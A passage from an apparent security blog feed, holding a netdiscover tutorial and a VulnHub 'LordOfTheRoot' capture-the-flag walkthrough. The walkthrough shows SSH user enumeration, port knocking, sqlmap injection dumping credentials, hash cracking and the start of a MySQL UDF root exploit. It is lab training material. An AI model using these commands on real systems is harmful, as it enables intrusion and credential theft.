</span><span class='line'>      7863807 blocks of size 4096. 5348507 blocks available
</span><span class='line'>//192.168.217.141/IPC$    Mapping: OK Listing: DENIED
</span><span class='line'>//192.168.217.141/NETLOGON    Mapping: OK, Listing: OK
</span><span class='line'>//192.168.217.141/ops Mapping: OK, Listing: OK
</span><span class='line'>//192.168.217.141/SYSVOL  Mapping: OK, Listing: OK
</span><span class='line'>//192.168.217.141/testshare   Mapping: OK, Listing: OK</span></code></pre></td></tr></table></div></figure>


<p>Once you&rsquo;re on the same network as your target, enum4linux is a great resource to help in gathering information about the target, that you can later use for an attack.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Your lucky number is 3552664958674928. \
</span><span class='line'>\ Watch for it everywhere.               /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Netdiscover - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/16/netdiscover-kali-linux-tools/"/>
    <updated>2017-06-16T13:05:44-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/16/netdiscover-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: a tool that can be used to perform ARP reconaissance and discover hosts on the local network. You could do that with Nmap too, but here netdiscover shines!</p>

<!-- more -->


<p>Homepage: <a href="https://github.com/alexxy/netdiscover">https://github.com/alexxy/netdiscover</a></p>

<h2>Netdiscover description</h2>

<blockquote><p>netdiscover is an  active/passive  arp  reconnaissance  tool,  initialy
developed  to  gain  information  about  wireless networks without dhcp
servers in wardriving scenarios.  It  can  also  be  used  on  switched
networks.  Built  on top of libnet and libpcap, it can passively detect
online hosts or search for them by sending arp requests.</p>

<p>Furthermore, it can be used to inspect your network&rsquo;s arp  traffic,  or
find network addresses using auto scan mode, which will scan for common
local networks.</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/precise/man8/netdiscover.8.html">http://manpages.ubuntu.com/manpages/precise/man8/netdiscover.8.html</a></p>

<h2>Netdiscover options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Netdiscover 0.3-pre-beta7 [Active/passive arp reconnaissance tool]
</span><span class='line'>Written by: Jaime Penalba &lt;jpenalbae@gmail.com&gt;
</span><span class='line'>
</span><span class='line'>Usage: netdiscover [-i device] [-r range | -l file | -p] [-m file] [-s time] [-n node] [-c count] [-f] [-d] [-S] [-P] [-c]
</span><span class='line'>  -i device: your network device
</span><span class='line'>  -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8
</span><span class='line'>  -l file: scan the list of ranges contained into the given file
</span><span class='line'>  -p passive mode: do not send anything, only sniff
</span><span class='line'>  -m file: scan the list of known MACs and host names
</span><span class='line'>  -F filter: Customize pcap filter expression (default: "arp")
</span><span class='line'>  -s time: time to sleep between each arp request (milliseconds)
</span><span class='line'>  -n node: last ip octet used for scanning (from 2 to 253)
</span><span class='line'>  -c count: number of times to send each arp reques (for nets with packet loss)
</span><span class='line'>  -f enable fastmode scan, saves a lot of time, recommended for auto
</span><span class='line'>  -d ignore home config files for autoscan and fast mode
</span><span class='line'>  -S enable sleep time supression between each request (hardcore mode)
</span><span class='line'>  -P print results in a format suitable for parsing by another program
</span><span class='line'>  -N Do not print header. Only valid when -P is enabled.
</span><span class='line'>  -L in parsable output mode (-P), continue listening after the active scan is completed
</span><span class='line'>
</span><span class='line'>If -r, -l or -p are not enabled, netdiscover will scan for common lan addresses.</span></code></pre></td></tr></table></div></figure>


<h2>Netdiscover usage</h2>

<p>Simply typing netdiscover at the terminal will launch its autoscan. The screen is interactive, and you can see new hosts as they appear.</p>

<ul>
<li>scan range</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netdiscover -r 192.168.217.0/24
</span><span class='line'>Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                      
</span><span class='line'>                                                                                                                                                    
</span><span class='line'> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                    
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
</span><span class='line'> -----------------------------------------------------------------------------
</span><span class='line'> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor                                                                                   
</span><span class='line'> 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor                                                                                   
</span><span class='line'> 192.168.217.254 00:50:56:f2:e2:e6      1      60  Unknown vendor     </span></code></pre></td></tr></table></div></figure>


<ul>
<li>passive scan (don&rsquo;t send anything, just sniff)</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netdiscover -p
</span><span class='line'> Currently scanning: (passive)   |   Screen View: Unique Hosts                                                                                      
</span><span class='line'>                                                                                                                                                    
</span><span class='line'> 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                    
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
</span><span class='line'> -----------------------------------------------------------------------------
</span><span class='line'> 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor                                                                                   
</span><span class='line'> 192.168.217.138 00:0c:29:43:d4:3e      1      60  Unknown vendor      </span></code></pre></td></tr></table></div></figure>


<p>This takes longer, because netdiscover is waiting to see the ARP requests and replies between other hosts</p>

<ul>
<li>fast scan</li>
</ul>


<blockquote><p>-f     Enable  fast  mode  scan. This will only scan for .1, .100 and .254 on each network. This mode is useful while
searching for ranges being used. After you found such range you can make a specific range scan to find online boxes.</p></blockquote>

<ul>
<li>produce parseable output and stop after scanning</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netdiscover -r 192.168.217.0/24 -P
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
</span><span class='line'> -----------------------------------------------------------------------------
</span><span class='line'> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor
</span><span class='line'> 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor
</span><span class='line'> 192.168.217.138 00:0c:29:43:d4:3e      1      60  Unknown vendor
</span><span class='line'> 192.168.217.254 00:50:56:f2:e2:e6      1      60  Unknown vendor
</span><span class='line'>
</span><span class='line'>-- Active scan completed, 4 Hosts found.</span></code></pre></td></tr></table></div></figure>


<p>Cookie:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>_____________________________________
</span><span class='line'>/ F.S. Fitzgerald to Hemingway:        \
</span><span class='line'>|                                      |
</span><span class='line'>| "Ernest, the rich are different from |
</span><span class='line'>| us." Hemingway:                      |
</span><span class='line'>|                                      |
</span><span class='line'>\ "Yes. They have more money."         /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Bow before the Lord of the Root]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root/"/>
    <updated>2017-06-12T11:08:37-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root</id>
    <content type="html"><![CDATA[<p>Back to looking through VulnHub&rsquo;s selection of virtual machines, I got hooked by the name of this one. The author intended for this machine to be similar in difficulty to those in the OSCP lab, so it&rsquo;s definitely good training if you&rsquo;re preparing to jump into the fray!</p>

<!-- more -->


<p>The port scan revealed only 1 open port:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)</span></code></pre></td></tr></table></div></figure>


<p>I also ran a UDP scan, but got nothing. I proceeded to google the SSH version, and got a hit quite fast. It appears that this OpenSSH version is vulnerable to <a href="https://www.ubuntu.com/usn/usn-3061-1/">CVE-2016-6210</a>, which allows users to be enumerated.</p>

<p>Luckily for us, there is an <a href="https://www.exploit-db.com/exploits/40136/">exploit</a> available.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python 40136.py -h
</span><span class='line'>usage: 40136.py [-h] [-u USER | -U USERLIST] [-e] [-s] [--bytes BYTES]
</span><span class='line'>                [--samples SAMPLES] [--factor FACTOR] [--trials TRIALS]
</span><span class='line'>                host
</span><span class='line'>
</span><span class='line'>positional arguments:
</span><span class='line'>  host                  Give SSH server address like ip:port or just by ip
</span><span class='line'>
</span><span class='line'>optional arguments:
</span><span class='line'>  -h, --help            show this help message and exit
</span><span class='line'>  -u USER, --user USER  Give a single user name
</span><span class='line'>  -U USERLIST, --userlist USERLIST
</span><span class='line'>                        Give a file containing a list of users
</span><span class='line'>  -e, --enumerated      Only show enumerated users
</span><span class='line'>  -s, --silent          Like -e, but just the user names will be written to
</span><span class='line'>                        stdout (no banner, no anything)
</span><span class='line'>  --bytes BYTES         Send so many BYTES to the SSH daemon as a password
</span><span class='line'>  --samples SAMPLES     Collect so many SAMPLES to calculate a timing baseline
</span><span class='line'>                        for authenticating non-existing users
</span><span class='line'>  --factor FACTOR       Used to compute the upper timing boundary for user
</span><span class='line'>                        enumeration
</span><span class='line'>  --trials TRIALS       try to authenticate user X for TRIALS times and
</span><span class='line'>                        compare the mean of auth timings against the timing
</span><span class='line'>                        boundary</span></code></pre></td></tr></table></div></figure>


<p>So you have to give the script a username or a list of users to enumerate. Well, we already know one user! If you glanced at the LordOfTheRoot VM after it booted, you probably noticed good old smeagol:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/smeagol.png" title="smeagol" alt="smeagol"></p>

<p>Ran the script with the smeagol username:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python 40136.py -u smeagol 192.168.217.136
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>User name enumeration against SSH daemons affected by CVE-2016-6210
</span><span class='line'>Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] Testing SSHD at: 192.168.217.136:22, Banner: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3
</span><span class='line'>[*] Getting baseline timing for authenticating non-existing users............
</span><span class='line'>[*] Baseline mean for host 192.168.217.136 is 0.0507569 seconds.
</span><span class='line'>[*] Baseline variation for host 192.168.217.136 is 0.0110011491622 seconds.
</span><span class='line'>[*] Defining timing of x &lt; 0.0837603474867 as non-existing user.
</span><span class='line'>[*] Testing your users...
</span><span class='line'>[+] smeagol - timing: 0.425467</span></code></pre></td></tr></table></div></figure>


<p>We know there is a smeagol user on the box, but couldn&rsquo;t find any other exploit that might help in this situation. So I just tried SSH&#8217;ing into the box to see what happens:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh smeagol@192.168.217.136
</span><span class='line'>The authenticity of host '192.168.217.136 (192.168.217.136)' can't be established.
</span><span class='line'>ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added '192.168.217.136' (ECDSA) to the list of known hosts.
</span><span class='line'>
</span><span class='line'>                                                  .____    _____________________________
</span><span class='line'>                                                  |    |   \_____  \__    ___/\______   \
</span><span class='line'>                                                  |    |    /   |   \|    |    |       _/
</span><span class='line'>                                                  |    |___/    |    \    |    |    |   \
</span><span class='line'>                                                  |_______ \_______  /____|    |____|_  /
</span><span class='line'>                                                          \/       \/                 \/
</span><span class='line'> ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
</span><span class='line'>|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
</span><span class='line'>|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
</span><span class='line'>|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
</span><span class='line'>|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
</span><span class='line'>        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
</span><span class='line'>Easy as 1,2,3
</span><span class='line'>smeagol@192.168.217.136's password: </span></code></pre></td></tr></table></div></figure>


<p>Woot, a banner with a hint! The knock part might reference port knocking, as I&rsquo;ve seen that in some previous challenges. And the ports seem to be mentioned already! I used Nmap to knock on ports 1,2 and 3:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -r -p1,2,3 192.168.217.136
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-12 12:31 EDT
</span><span class='line'>Nmap scan report for 192.168.217.136
</span><span class='line'>Host is up (0.00065s latency).
</span><span class='line'>PORT  STATE    SERVICE
</span><span class='line'>1/tcp filtered tcpmux
</span><span class='line'>2/tcp filtered compressnet
</span><span class='line'>3/tcp filtered compressnet</span></code></pre></td></tr></table></div></figure>


<p>The <code>-r</code> option was necessary to scan the ports in consecutive order. After knocking, I ran the full Nmap scan again, and a web server now awaited me:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span></code></pre></td></tr></table></div></figure>


<p>I checked it out in the browser, and found this image:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/willdo.jpeg" title="mordor" alt="take the ring to mordor"></p>

<p>Ran exiftool and strings on the picture, didn&rsquo;t find anything. Next I went to the <em>/images</em> directory where the image was served from, and found 2 more. Downloaded them and put them through exiftool and strings, still no results. In the meantime, I had also fired up a directory bruteforce on the server, but that didn&rsquo;t get me anywhere either. So the next thing I tried was to see if there is a directory called smeagol on the web server. There wasn&rsquo;t, but I was presented this picture, one of the 3 images found:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/hipster.jpg" title="hipster" alt="hipster"></p>

<p>Further testing confirmed that this image acted as a 404 page. But when I looked at the source, I found a suspicious string in a comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;</span></code></pre></td></tr></table></div></figure>


<p>I put the string into a <a href="https://encoder.mattiasgeniar.be/index.php">multipurpose online decoder</a> and got a base64 string out of it: <code>Lzk3ODM0NTIxMC9pbmRleC5waHA=</code>. Decoding it revealed a directory on the web server: <code>/978345210/index.php</code>. Going there, I found a login page!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/mordor.png" title="mordor" alt="mordor login"></p>

<p>Time for sqlmap! I had to play with it and tweak quite a bit, the default levels didn&rsquo;t report any injection vulnerability, and the scan took so long, I had to break the enumeration into manageable pieces:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" --current-db</span></code></pre></td></tr></table></div></figure>


<p>First, I queried for the current DB in use. I also turned on all the optimizaton switches, raised testing levels, and started with the username parameter. And luckily, it was vulnerable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>current database:    'Webapp'</span></code></pre></td></tr></table></div></figure>


<p>Next, I dumped the discovered database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" -D Webapp --dump
</span><span class='line'>[...]
</span><span class='line'>Database: Webapp
</span><span class='line'>Table: Users
</span><span class='line'>[5 entries]
</span><span class='line'>+----+----------+------------------+
</span><span class='line'>| id | username | password         |
</span><span class='line'>+----+----------+------------------+
</span><span class='line'>| 1  | frodo    | iwilltakethering |
</span><span class='line'>| 2  | smeagol  | MyPreciousR00t   |
</span><span class='line'>| 3  | aragorn  | AndMySword       |
</span><span class='line'>| 4  | legolas  | AndMyBow         |
</span><span class='line'>| 5  | gimli    | AndMyAxe         |
</span><span class='line'>+----+----------+------------------+</span></code></pre></td></tr></table></div></figure>


<p>Now that I had usernames and passwords, it was time to test them on SSH! I started with smeagol, because it looked slightly different than the others :&ndash;) And I got in:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:~$ uname -a
</span><span class='line'>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>So, especially for older machines, one of the first things I do is check the kernel version. Googling it actually yielded a <a href="https://www.exploit-db.com/exploits/39166/">privilege escalation exploit</a> right away. I decided to save this approach for last, because the exploit wasn&rsquo;t known at the time of the VM release. Instead, I proceeded to some more conventional enumeration.</p>

<p>I downloaded my <a href="https://github.com/chousensha/linux_privcheck">linux_privcheck</a> tool with <code>wget <a href="https://raw.githubusercontent.com/chousensha/linux_privcheck/master/privinfo.py">https://raw.githubusercontent.com/chousensha/linux_privcheck/master/privinfo.py</a></code> and ran it on the machine while I ate a lasagna. Then I combed through the output (note to self: I have to revisit my script and make improvements to it, will get to it). The interesting tidbits that I observed were:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root      1174     1  0 08:15 ?        00:00:08 /usr/sbin/mysqld</span></code></pre></td></tr></table></div></figure>


<p>MySQL running as root! Definitely on to something there, as we could get root credentials from SQLi. The other thing I found were some setuid binaries in a suspicious folder:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/SECRET/door2/file
</span><span class='line'>/SECRET/door1/file
</span><span class='line'>/SECRET/door3/file</span></code></pre></td></tr></table></div></figure>


<p>The machine description on VulnHub stated that there are 2 methods for gaining privilege escalation..and here we are with 2 possible venues of attack! Let&rsquo;s take them in order!</p>

<h2>Privilege escalation method #1 &ndash; via MySQL</h2>

<p>With MySQL running as root, we can use <a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">a UDF and a setuid binary to gain a root shell</a>. At the core of this exploit is the fact that a User Defined Function can be evaluated as SQL code to run commands in the context of the MySQL process, which is root in this case. As I was reading through the article, it became clear that root credentials would be needed for the database server. So I went back to sqlmap, and this time added the switches <code>&mdash;users</code> and <code>&mdash;passwords</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>database management system users [5]:
</span><span class='line'>[*] 'debian-sys-maint'@'localhost'
</span><span class='line'>[*] 'root'@'127.0.0.1'
</span><span class='line'>[*] 'root'@'::1'
</span><span class='line'>[*] 'root'@'localhost'
</span><span class='line'>[*] 'root'@'lordoftheroot'
</span><span class='line'>
</span><span class='line'>database management system users password hashes:
</span><span class='line'>[*] debian-sys-maint [1]:
</span><span class='line'>    password hash: *A55A9B9049F69BC2768C9284615361DFBD580B34
</span><span class='line'>[*] root [1]:
</span><span class='line'>    password hash: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F</span></code></pre></td></tr></table></div></figure>


<p>I used an online cracker for the root hash, and the cracked password was <em>darkshadow</em>. Then I connected to the MySQL database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:~$ mysql -u root -p 
</span><span class='line'>Enter password: 
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 1829
</span><span class='line'>Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)
</span><span class='line'>
</span><span class='line'>Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql&gt; </span></code></pre></td></tr></table></div></figure>


<p>Next, I followed the steps of the <a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">infamoussyn article</a>, which are really well explained. UDF files need to be <a href="https://dev.mysql.com/doc/refman/5.7/en/udf-compiling.html">locally compiled and installed on the server host</a>, and a special directory is required for that..</p>

<ul>
<li>Find the location where MySQL looks for shared object files, identified by the <code>plugin_dir</code> variable:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; show variables like "plugin_dir";
</span><span class='line'>+---------------+------------------------+
</span><span class='line'>| Variable_name | Value                  |
</span><span class='line'>+---------------+------------------------+
</span><span class='line'>| plugin_dir    | /usr/lib/mysql/plugin/ |
</span><span class='line'>+---------------+------------------------+
</span><span class='line'>1 row in set (0.00 sec)</span></code></pre></td></tr></table></div></figure>


<p>The required directory is found at <code>/usr/lib/mysql/plugin/</code>. This is where we&rsquo;ll put our UDF object files.</p>

<ul>
<li>Now it&rsquo;s time to compile the object file. The exploit that allows privilege escalation is called<a href="https://www.exploit-db.com/exploits/1518/">raptor_udf2.c</a>. I downloaded it to the compromised machine, and followed the instructions in the source code to compile it:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -g -c raptor_udf2.c</span></code></pre></td></tr></table></div></figure>


<p>If you are lost in the myriad of GCC options from its manpage, there is a cool page offering <a href="https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html">options summary</a> in a way that lets you jump to whatever interests you. Here, I compiled the C file without linking, and with debugging information. This produced an object file called <code>raptor_udf2.o</code>.</p>

<ul>
<li>Next, you create a shared library and link it:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
